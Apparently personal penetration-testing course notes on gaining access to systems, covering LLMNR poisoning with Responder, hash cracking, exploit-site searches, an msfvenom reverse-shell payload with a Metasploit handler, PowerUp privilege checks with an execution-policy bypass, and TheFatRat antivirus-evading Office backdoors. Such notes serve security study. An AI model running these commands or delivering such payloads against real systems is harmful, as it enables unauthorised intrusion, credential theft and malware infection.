# System Hacking

Four steps:
  - Gaining Access
  - Escalating Privileges
  - Maintaining Access
  - Clearing Logs

Fuzz
  - https://resources.infosecinstitute.com/topic/fuzzer-automation-with-spike/

Buffer overflow
  - https://datacellsolutions.com/2020/09/23/exploiting-a-simple-stack-based-buffer-overflow-vulnerability/
  - https://guif.re/bo#Finding%20a%20JMP%20ESP

## Gain Access

### Perform Active Online Attack to Crack the System’s Password using Responder

**LLMNR** (Link Local Multicast Name Resolution)
- NetBIOS and LLMNR are protocols used to resolve host names on local networks.
- LLMNR is designed for consumer-grade networks in which a domain name system (DNS) server might not exist.

**NBT-NS** 
- NetBIOS Name Service

**Responder.py**：
1. an LLMNR, NBT-NS, and MDNS poisoner.
2. ``` cd Responder ```
3. ``` sudo ./Responder.py -I eth0 ``` Responder starts listening to the network interface for events.
4. Target windows try to open file in the LAN. cmd open "\\CET-TOOLS123"
5. Responder collects the hashes of the logged-in user of the target machine.
6. Logs at "/Responder/logs"

**John the Ripper**:
1. Crack hashes.
2. ``` sudo snap install john-the-ripper ``` Snap is a software packaging and deployment system.
3. ``` sudo john /home/ubuntu/Responder/logs/[Log File Name.txt] ```

### Audit System Passwords
  
 L0phtCrack 

### Find Vulnerabilities on Exploit Sites

https://www.exploit-db.com/
1. SEARCH EDB.
2. Exploit Database Advanced Search.
3. Download the exploit code.

Other tools:
- VulDB (https://vuldb.com).
- MITRE CVE (https://cve.mitre.org).
- Vulners (https://vulners.com).
- CIRCL CVE Search (https://cve.circl.lu).

### Exploit Client-Side Vulnerabilities and Establish a VNC Session
1. VNC (Virtual Network Computing). remotely control another computer.
2. Msfvenom
- ``` msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP of Host Machine] LPORT=444 -o /root/Desktop/Test.exe ```
3. Test.exe is a malicious file for Windows to execute.
4. 
``` 
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST [ip]
msf6 > exploit
```

5. Windows run Test.exe
6. Get connection.
7. ``` meterpreter > upload /root/PowerSploit/Privesc/PowerUp.ps1 PowerUp.ps1 ```
- PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.
8. ``` meterpreter > shell ```
9. In windows shell: ``` powershell -ExecutionPolicy Bypass -Command ". .\PowerUp.ps1;Invoke-AllChecks" ```
10. Find a vulnerability in VNC
11. exploit VNC vulnerability

### Gain Access to a Remote System using Armitage

Using this tool, you can create sessions, share hosts, capture data, downloaded files, communicate through a shared event log, and run bots to automate pen testing tasks.

### Hack a Windows Machine with a Malicious Office Document using TheFatRat
- compiles malware with a popular payload that can then be executed on Windows, Android, and Mac OSes. 
- an easy way to create backdoors and payloads that can bypass most anti-viruses.

1. ``` #fatrat ```
2. 06 Create Fud Backdoor 1000% with PwnWinds
3. 03 Create exe file with apache + Powershell
4. 07 Create Backdoor For Office with Microsploit
5. |2| The Microsoft Office Macro on Windows
6. Use the payload just created, at /root/Fatrat_Generated/payload.exe
7. Try to deliver the file to the Windows victim.
8. msfconsole. multi/handler -> reverse_tcp

### Perform Buffer Overflow Attack to Gain Access to a Remote System
Steps:
1. Fuzzing the application to determine the crashing of the application
2. Finding the exact location of the crash (called the Offset)
3. Confirming the offset, and control over the flow of execution by Overwriting the Instruction Pointer (EIP)
4. Checking for bad characters
5. Finding the application library with no memory protections
6. And finally, gaining access to the target

[buffer over flow](bof.md)

## Privilege Escalation

## Maintain Access & Hide

## Clear Log
